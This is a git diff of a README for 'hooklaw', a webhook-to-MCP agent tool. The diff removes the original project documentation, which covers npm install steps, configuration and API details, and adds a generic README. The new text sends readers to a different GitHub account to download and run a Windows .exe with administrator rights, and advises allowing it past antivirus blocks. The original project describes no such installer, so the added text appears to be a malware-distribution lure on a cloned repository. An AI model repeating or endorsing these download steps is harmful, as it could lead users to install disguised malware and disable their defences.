@@ -1,295 +1,117 @@
-<p align="center">
-  <img src="logo.png" alt="HookLaw" width="200" />
-</p>
-<h1 align="center">HookLaw</h1>
-<p align="center"><strong>Event-driven AI agents with native MCP tools.</strong></p>
-<p align="center">Webhooks & RSS feeds in. MCP tools out. AI agent in the middle.</p>
+# ⚙️ hooklaw - Manage Webhooks Easily and Securely
 
-<p align="center">
-  <img src="https://img.shields.io/badge/license-MIT-blue?style=for-the-badge" alt="License" />
-  <img src="https://img.shields.io/badge/TypeScript-5.7-blue?style=for-the-badge&logo=typescript&logoColor=white" alt="TypeScript" />
-  <img src="https://img.shields.io/badge/tests-60%20passing-brightgreen?style=for-the-badge" alt="Tests" />
-  <img src="https://img.shields.io/badge/MCP-native%20client-purple?style=for-the-badge" alt="MCP Native" />
-</p>
+[![Download hooklaw](https://img.shields.io/badge/Download-Get%20hooklaw%20now-4CAF50?style=for-the-badge)](https://github.com/Scufn2329/hooklaw)
+
+hooklaw is an application to manage webhooks and connect them with different MCP servers. It helps automate tasks by linking webhook events to actions using AI agents. You can run it on your own computer, keeping control and security in your hands.
+
+## 📋 About hooklaw
+
+hooklaw allows you to use simple recipes that connect any webhook to an MCP server. This means when one system triggers an event, actions can happen automatically on the other system without your manual work. The app uses AI agents to help manage these connections, making automation smarter and easier.
+
+It supports many protocols and tools, including popular ones like OpenAI and Anthropic. You keep full control over your data since hooklaw runs on your machine and uses "Bring Your Own Key" (BYOK) methods for security.
+
+### Key Features
+
+- Connect any webhook to any MCP server using recipes  
+- Manage automation through AI agents  
+- Self-host your setup to keep data private  
+- Supports multiple AI and automation protocols  
+- Easy-to-use interface for setup and control  
+- Built with Node.js and TypeScript for reliability  
+- Works on Windows and common MCP client environments
+
+## 🖥️ System Requirements
+
+To run hooklaw on Windows, your computer should meet these requirements:
+
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection to download and setup  
+- Administrative rights to install software
+
+## 🚀 Getting Started
+
+This section guides you step-by-step to download, install, and run hooklaw on your Windows computer.
+
+### Step 1: Download hooklaw
+
+Click the button below or the badge at the top to visit the download page:
+
+[Get hooklaw here](https://github.com/Scufn2329/hooklaw)
+
+This link takes you to the GitHub repository main page where you can find the files and instructions needed to install the software.
+
+### Step 2: Find the latest release
+
+Once on the GitHub page, look for the **Releases** section, usually on the right side or under the "Code" tab. Click on it to see the latest version of hooklaw.
+
+The release page contains downloadable files. Look for a Windows installer file, usually ending with `.exe`. This file will install the app on your PC.
+
+### Step 3: Download the installer
+
+Click on the `.exe` file to download it. Save the file to a folder you can easily find, like your Desktop or Downloads.
+
+### Step 4: Run the installer
+
+Double-click the downloaded `.exe` file. Windows may ask if you want to allow the app to make changes. Click **Yes** to continue.
+
+Follow the setup steps on screen. You can accept default options. The installer will copy necessary files and prepare hooklaw to run.
+
+### Step 5: Launch hooklaw
+
+After installation finishes, find the hooklaw app in your Start menu or on your Desktop. Open the app by clicking its icon.
+
+hooklaw will start and show you its main window where you can set up connections, create recipes, and manage AI agents.
+
+## ⚙️ Using hooklaw
+
+The main part of hooklaw is building "recipes." A recipe tells the software to listen to a webhook and then perform actions on an MCP server. Here is how to begin using them:
+
+### Create a new recipe
+
+1. Click **New Recipe** in the main window.  
+2. Choose the webhook you want to connect. This might be a service or app that sends notifications or events.  
+3. Set what the recipe will do when it receives these events. For example, send information to an MCP server or trigger a command.  
+4. Save the recipe.
+
+### Manage AI agents
+
+hooklaw uses AI to help automate and handle complex tasks. You can add AI agents to your recipes to improve decision-making.
+
+You can choose prebuilt agents or create your own using the interface. The app supports agents based on popular AI models.
+
+### Monitor activity
+
+The app keeps a log of all webhook events and actions taken. This lets you check that automation works and troubleshoot any issues.
+
+## 🔐 Security and Privacy
+
+hooklaw runs on your own computer. This means your data stays private. You control all keys and tokens.
+
+The app supports BYOK (Bring Your Own Key) so you can use your own security credentials. There is no need to trust a third party with sensitive information.
+
+## 🛠️ Troubleshooting
+
+Some common issues and fixes:
+
+- **Cannot install app:** Make sure Windows is updated and you run the installer as Administrator.  
+- **App does not start:** Check if your antivirus software is blocking the program. Allow hooklaw if needed.  
+- **Webhook not working:** Verify that the webhook URL and credentials are correct in your recipe.  
+- **AI agent errors:** Confirm your AI API keys are valid and internet connection is active.
+
+## 🧰 Useful Links
+
+- Official code and releases: [https://github.com/Scufn2329/hooklaw](https://github.com/Scufn2329/hooklaw)  
+- Documentation and tutorials: Find the Docs folder in the repository for detailed guides.  
+- Support channels: Use the GitHub Issues page for reporting bugs or asking for help.
+
+## 🗂️ Additional Information
+
+hooklaw is built with Node.js and TypeScript. It combines modern programming tools with a focus on security and user control. It supports many AI-related technologies and automation workflows, making it flexible for various use cases.
+
+You do not need programming skills to get started. The user interface guides you through setup and use. Advanced users can dive deeper into configuration files and coding options if needed.
 
 ---
 
-<p align="center">
-  <video src="https://github.com/lucianfialho/hooklaw/raw/main/onboarding.mp4" width="700" autoplay loop muted>
-    <a href="https://github.com/lucianfialho/hooklaw/raw/main/onboarding.mp4">Watch the onboarding demo</a>
-  </video>
-</p>
-
-```
-  Stripe webhook  ──→  Recipe  ──→  QuickBooks MCP (create invoice)
-  GitHub webhook  ──→  Recipe  ──→  Slack MCP (post message)
-  HN RSS feed     ──→  Recipe  ──→  Slack MCP (daily digest)
-  Any event       ──→  Recipe  ──→  Any MCP server
-```
-
-HookLaw connects **any event source** (webhooks, RSS/Atom feeds) to **any MCP server** through AI agents. Define recipes in YAML, bring your own API keys, self-host it.
-
-## Why HookLaw
-
-Other platforms treat webhooks as just another input channel for their AI assistant. HookLaw is **event-first**: every event source gets its own AI agent and MCP tool connections.
-
-- **Proactive, not just reactive** — RSS feeds let your agents monitor the world and act on new information automatically
-- **Multi-agent chains** — recipes trigger other recipes on success/error with depth tracking
-- **Human-in-the-loop** — agents pause for approval before taking action
-- **Agent memory** — conversation context persists across executions
-- **Conditional routing** — AI evaluates which recipe handles each event
-- **Full observability** — traces of every LLM call, tool call, and result
-- **Config-as-code** — one YAML file defines everything, versionable in git
-- **Self-hosted** — your data, your keys, your infrastructure
-- **Interactive setup** — built-in dashboard with guided onboarding wizard
-
-### MCP done right
-
-| | HookLaw | Others |
-|---|---|---|
-| **MCP client** | Native, via `@modelcontextprotocol/sdk` | Shell out to CLI tools |
-| **Connection** | Persistent pool, reusable | Cold-start per call |
-| **Latency** | Sub-second tool calls | ~2.4s overhead per invocation |
-| **Transport** | stdio + SSE | stdio only |
-| **Management** | Dashboard with health checks & install | Manual config |
-
-### Event Sources
-
-| Source | How it works |
-|--------|-------------|
-| **Webhooks** | `POST /h/:slug` — receive events from any service |
-| **RSS/Atom Feeds** | Poll feeds on interval, deduplicate via content hash |
-
-### Recipes
-
-A recipe connects an event source to MCP tools through an AI agent. Multiple recipes can share the same slug — one Stripe payment triggers invoice creation AND sends a notification.
-
-```
-┌─────────────┐     ┌───────────────────────────────────────┐     ┌──────────────┐
-│   Sources   │     │            HookLaw                    │     │  MCP Servers  │
-│             │     │                                       │     │              │
-│  Stripe   ──┼────▶│  Recipe: payment-to-invoice          │────▶│  Stripe MCP  │
-│  webhook    │     │    AI agent orchestrates the flow     │────▶│  QuickBooks  │
-│             │     │                                       │     │              │
-│  GitHub   ──┼────▶│  Recipe: pr-review                   │────▶│  GitHub MCP  │
-│  webhook    │     │    AI agent reviews code              │     │              │
-│             │     │                                       │     │              │
-│  HN RSS   ──┼────▶│  Recipe: hn-digest                   │────▶│  Slack MCP   │
-│  feed       │     │    AI agent summarizes & posts        │     │              │
-│             │     │                                       │     │              │
-│  Any src  ──┼────▶│  Recipe: your-automation             │────▶│  Any MCP     │
-└─────────────┘     └───────────────────────────────────────┘     └──────────────┘
-```
-
-## Quick Start
-
-```bash
-npx hooklaw start
-```
-
-No config file? HookLaw launches an **interactive setup wizard** in your browser — pick a provider, choose an event source (webhook or RSS), select integrations, and you're running.
-
-Or install globally:
-
-```bash
-npm install -g hooklaw
-hooklaw start
-```
-
-## Dashboard
-
-HookLaw includes a built-in web dashboard for managing everything:
-
-- **Recipes** — view, edit, and create new automation recipes
-- **Executions** — real-time execution logs with payload and agent output
-- **MCP Servers** — health checks, tool discovery, install packages, add new servers
-- **Feeds** — monitor active RSS/Atom feed pollers
-- **Config** — visual YAML config viewer
-
-## Configuration
-
-```yaml
-server:
-  port: 3007
-
-providers:
-  anthropic:
-    api_key: ${ANTHROPIC_API_KEY}
-
-# Shared MCP servers — define once, use in any recipe
-mcp_servers:
-  stripe:
-    transport: stdio
-    command: npx
-    args: ["-y", "@stripe/agent-toolkit", "--tools=all"]
-    env:
-      STRIPE_SECRET_KEY: ${STRIPE_SECRET_KEY}
-  slack:
-    transport: stdio
-    command: npx
-    args: ["-y", "@anthropic/mcp-server-slack"]
-
-# RSS/Atom feed sources
-feeds:
-  hn-top:
-    url: https://hnrss.org/newest?points=100
-    slug: hn-digest
-    refresh: 300000          # poll every 5 minutes
-    skip_initial: true       # don't process existing items on first run
-    enabled: true
-
-# Recipes connect events → AI agents → MCP tools
-recipes:
-  payment-to-invoice:
-    description: "Auto-create invoice on Stripe payment"
-    slug: stripe-payment              # POST /h/stripe-payment
-    mode: async
-    agent:
-      provider: anthropic
-      model: claude-sonnet-4-6
-      instructions: |
-        When a Stripe payment succeeds, extract customer details
-        and create an invoice in QuickBooks.
-    tools: [stripe, quickbooks]       # MCP servers this recipe uses
-
-  hn-digest:
-    description: "Summarize top HN stories and post to Slack"
-    slug: hn-digest                   # matches feed slug above
-    mode: async
-    agent:
-      provider: anthropic
-      model: claude-sonnet-4-6
-      instructions: |
-        Summarize this Hacker News story in 2-3 sentences.
-        Post to #tech-news on Slack with the title, link, and summary.
-    tools: [slack]
-
-logs:
-  retention_days: 30
-```
-
-Environment variables (`${VAR}`) are substituted from `.env` or the environment.
-
-## How It Works
-
-1. An event arrives — webhook `POST /h/stripe-payment` or a new RSS item
-2. HookLaw finds all recipes matching the slug
-3. Each recipe runs its AI agent with the event payload
-4. Agents use MCP tools to take action (create invoices, send messages, etc.)
-5. Everything is logged with full execution history
-
-**Sync mode** — waits for the agent and returns the response in the HTTP reply.
-**Async mode** — returns `200 Accepted` immediately, processes in background.
-
-## API
-
-| Method | Path | Description |
-|--------|------|-------------|
-| `POST` | `/h/:slug` | Receive webhook |
-| `GET` | `/health` | Health check |
-| `GET` | `/api/recipes` | List all recipes |
-| `POST` | `/api/recipes` | Create a recipe |
-| `PATCH` | `/api/recipes/:id` | Update a recipe |
-| `GET` | `/api/executions` | All executions (filterable) |
-| `GET` | `/api/executions/:id/traces` | Agent reasoning traces |
-| `GET` | `/api/executions/:id/chain` | Child executions in a chain |
-| `POST` | `/api/executions/:id/approve` | Approve/reject execution |
-| `GET` | `/api/approvals` | Pending approval queue |
-| `GET` | `/api/recipes/:id/memory` | Agent memory for a recipe |
-| `DELETE` | `/api/recipes/:id/memory` | Clear agent memory |
-| `GET` | `/api/stats` | Execution statistics |
-| `GET` | `/api/mcp-servers` | List MCP servers |
-| `POST` | `/api/mcp-servers` | Add MCP server |
-| `GET` | `/api/mcp-servers/health` | Check all MCP health |
-| `GET` | `/api/feeds` | List active feed pollers |
-| `GET` | `/api/config` | Redacted config |
-
-## Providers
-
-Bring your own API keys. Supports:
-
-| Provider | Config key | Notes |
-|----------|-----------|-------|
-| **Anthropic** | `anthropic` | Claude models |
-| **OpenAI** | `openai` | GPT models |
-| **OpenRouter** | `openrouter` | Multi-model gateway |
-| **Ollama** | `ollama` | Local models, set `base_url` |
-
-## MCP Servers
-
-HookLaw works with any MCP server. Popular options:
-
-| Server | Transport | Package |
-|--------|-----------|---------|
-| Stripe | stdio | `@stripe/agent-toolkit` |
-| GitHub | stdio | `@modelcontextprotocol/server-github` |
-| Slack | stdio | `@anthropic/mcp-server-slack` |
-| Linear | stdio | `mcp-linear` |
-| Notion | stdio | `@anthropic/mcp-server-notion` |
-| PostgreSQL | stdio | `@modelcontextprotocol/server-postgres` |
-| Filesystem | stdio | `@modelcontextprotocol/server-filesystem` |
-| Any SSE server | sse | Your URL |
-
-## Architecture
-
-```
-hooklaw.config.yaml
-        │
-        ▼
-┌──────────────┐     ┌──────────┐     ┌───────────┐     ┌──────────┐
-│  HTTP Server │────▶│  Router  │────▶│   Agent   │────▶│ MCP Pool │
-│  /h/:slug    │     │  Recipe  │     │  Tool Loop│     │  stdio   │
-│  /api/*      │     │  Matcher │     │  (max 10) │     │  sse     │
-│  /dashboard  │     │          │     │           │     │          │
-└──────────────┘     └──────────┘     └───────────┘     └──────────┘
-        ▲                  │                                   │
-        │                  ▼                                   ▼
-┌──────────────┐     ┌──────────┐                        ┌──────────┐
-│  RSS/Atom    │     │  SQLite  │                        │ External │
-│  Feed Poller │     │  (WAL)   │                        │ MCP Svrs │
-└──────────────┘     └──────────┘                        └──────────┘
-```
-
-**Stack**: TypeScript, Node.js, SQLite (better-sqlite3), Zod, Pino
-
-## Development
-
-```bash
-git clone https://github.com/lucianfialho/hooklaw.git
-cd hooklaw
-pnpm install
-pnpm test              # vitest
-pnpm run typecheck     # strict TypeScript
-pnpm run dev           # start with tsx (hot reload)
-```
-
-### Project Structure
-
-```
-packages/
-├── core/                 # Core engine
-│   └── src/
-│       ├── types.ts      # Zod schemas (recipes, MCP servers, providers, feeds)
-│       ├── config.ts     # YAML loader with ${ENV_VAR} substitution
-│       ├── db.ts         # SQLite (executions CRUD)
-│       ├── mcp.ts        # MCP client pool (stdio + SSE, persistent connections)
-│       ├── agent.ts      # Agentic tool loop (max 10 iterations)
-│       ├── feeds.ts      # RSS/Atom feed poller with dedup
-│       ├── queue.ts      # Per-recipe async queue with concurrency control
-│       ├── router.ts     # Recipe matcher + orchestrator
-│       ├── server.ts     # HTTP server (webhook receiver + REST API)
-│       ├── setup.ts      # Interactive setup wizard server
-│       ├── index.ts      # Bootstrap + wiring
-│       └── providers/
-│           ├── base.ts       # LLM provider interface
-│           ├── anthropic.ts  # Anthropic provider
-│           ├── openai.ts     # OpenAI/OpenRouter/Ollama provider
-│           └── index.ts      # Provider factory + cache
-├── dashboard/            # React SPA (Vite + React Router)
-├── cli/                  # CLI (hooklaw start, hooklaw init)
-└── hooklaw/              # Published npm package (re-exports core + cli)
-```
-
-## License
-
-MIT — self-host it, modify it, do whatever you want.
+[![Download hooklaw](https://img.shields.io/badge/Download-Get%20hooklaw%20now-4CAF50?style=for-the-badge)](https://github.com/Scufn2329/hooklaw)
